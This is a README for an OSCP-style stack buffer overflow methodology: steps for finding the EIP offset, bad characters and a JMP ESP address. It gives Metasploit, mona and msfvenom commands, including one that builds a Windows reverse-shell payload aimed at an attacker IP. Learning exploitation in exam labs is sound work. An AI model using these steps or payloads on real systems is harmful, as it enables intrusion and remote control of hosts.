# Buffer Overflow methodology

![GitHub Repo stars](https://img.shields.io/github/stars/3isenHeiM/OSCP-BoF?style=social) [![GitHub last commit (branch)](https://img.shields.io/github/last-commit/3isenHeiM/OSCP-BoF/master)](https://github.com/3isenHeiM/OSCP-BoF/commits) ![GitHub](https://img.shields.io/github/license/3isenHeiM/OSCP-BoF)


[![Python 3](https://img.shields.io/badge/python-3-blue.svg?logo=python&logoColor=white)](https://www.python.org/downloads/release/python-3/) ![GitHub Workflow Status](https://img.shields.io/github/workflow/status/3isenHeiM/OSCP-BoF/Linting)





[![Twitter Follow](https://img.shields.io/twitter/follow/3isenHeiM?style=social)](https://twitter.com/3isenHeiM)


## Introduction

These are 7 simple python scripts and a methodology **to ease** (not *automate* !) the exploitation.
Each script targets a phase of the exploitation :

1. Trigger the BoF (this is facultative for OSCP since they give you a code snippet)
2. Find the EIP offset
3. Confirm the offset
4. Find the badchars
5. Confirm badchars + find JMP ESP instruction
6. Confirm code execution (pop calc)
7. Exploit host

It's based on the [do stack buffer overflow good](https://github.com/justinsteven/dostackbufferoverflowgood)" project (BTW, it's awesomely explained).

## How to use

Follow each step and you'll be able to craft a working example of a BoF exploitation.

All the specific variable are stored in [1 single resource file](PARAMETERS.py),
to avoid any confusion during the exam.

After each step, fill the proper variables with values found and they'll be re-used for the next step

Note: If after each debug operation performed, the application has become unresponsive; Immunity Debugger should be closed first, then the "vulnapp.exe" application should be restarted, and Attach and Run should be done on Immunity Debugger.

## 0. Pre-start

Fill in the following variables in the [resource file](PARAMETERS.py) depending on the host to attack :
 * ``RHOST`` : the IP address of the host
 * ``RPORT`` : the port on which to access the application to exploit

## 1. Segmentation fault : [1_segfault.py](1_segfault.py)

Send enough length string for victim system crash.

Please note that the total length to input is often given in the exmaple they
provide in the exam.

Note the offeset in ``PARAMETERS.py``, in the variable ``offset_eip``.

## 2. Find the offset : [2_find_offset.py](2_find_offset.py)

Generate the pattern (adapt the buffer lenght) :

    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <String_Length>

    buf += ("<PATTERN>")

Put the output into the variable ``buf`` in ``2_find_offset.py`` & send it.

Once the app crashes, note down the value of the EIP register (which is the address of the next operation to be executed).




If needed : convert the EIP value to ASCII : echo "<EIP_value>" | xxd -r -p

Find the offset at which the sequence is met in the pattern :

    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_value>

Or, type this in Immunity Debugger : `!mona findmsp`.

Note the value of the EIP offet in the variable ``offset_eip`` in ``PARAMETERS.py``, and the value of the ESP offset in the variable ``offset_esp``.

## 3. Control the EIP : [3_confirm_offset.py](3_confirm_offset.py)

Execute this script as is.

In Immunity Debugger, make sure that
   - **BBBB** in the EIP (in hex, so ``42424242``)
   - **CCCCDDDDD.....** is written in what ESP points to

## 4. Find the bad chars : [4_find_badchars.py](4_find_badchars.py)

Send it to the application

In Immunity Debugger, make mona create a list of badchars :

    !mona bytearray –cpb “\x00”

The console output will tell you where it has been saved.

Compare this file with the stack contents :

    !mona compare -a ESP -f <file_with_bad_chars>
    !mona compare -a <WHATEVER ADDRESS> -f <file_with_bad_chars>

**Note: **always use the full path to the file !

In the mona output, ``Possibly bad chars`` are output.
Put them in the ``badchars`` array in ``PARAMETERS.py``.

## 5. Confirm badchars & find a JMP ESP instruction : [5_find_jmp_esp.py](5_find_jmp_esp.py)

### a. Confirm badchars

Make sure the badchars identified are mentionned in the ``PARAMETERS.py`` file.

Execute the script.

Re-generate a badchar sequence on mona :

    !mona bytearray -cpb "\x00\x04\x05\xA2\xA3\xAC\xAD\xC0\xC1\xEF\xF0"

The console output will tell you where it has been saved.

Compare the ``bytearray.bin`` (**use the full filepath**) and the buffer to make sure they are the same.
That will mean that no new badchar have been detected :

    !mona compare -a ESP -f <file_with_bad_chars>
    !mona compare -a <WHATEVER ADDRESS> -f <file_with_bad_chars>

The mona output status should be ``unmodified`` and you should get a message in the
console saying : ``!!! Hooray, normal shellcode unmodified !!!``

This mean that no other badchars have been detected.

### b. Find a JMP ESP

Ask mona to find the instruction ``JMP ESP`` that will allow the processor to execute
whatever we have put in the stack.

    !mona jmp -r esp -cpb "<bad_chars>"       formatted like this : "\x00\x01"

Put the address returned in the variable ``ptr_jmp_esp`` in ``PARAMETERS.py``


## 6. Pop calc : [6_pop_calc.py](6_pop_calc.py)

This will confirm the code execution on the target host.
This can be used to validate the build-up of the exploit, and set a working basis.

Launch this to produce the shellcode that will make calc pop on the target :

    msfvenom -p windows/exec -b '<badchars>' -f python --var-name shellcode_calc \
    CMD=calc.exe EXITFUNC=thread

Insert the output (python variable ``shellcode_calc``) in the script ``6_pop_calc.py``.

In the script, we will also move ESP up in the stack (instruction ``SUB ESP,0x10``)
This is to avoid the ESP overwrite by the encoder of the payload.
Some guys use a NOP sled, here is a more proper way ;)

Launch the script and enjoy popping calc!

## 7. Create shellcode : [7_exploit.py](7_exploit.py)

Now, you can craft any other shellcode as long as you respect the badchars :

    msfvenom -p windows/shell_reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_Port> \
    -f py -b '<badchars>' -e x86/shikata_ga_nai --var-name shellcode

Insert the output (python variable ``shellcode_calc``) in the script ``7_exploit.py``.
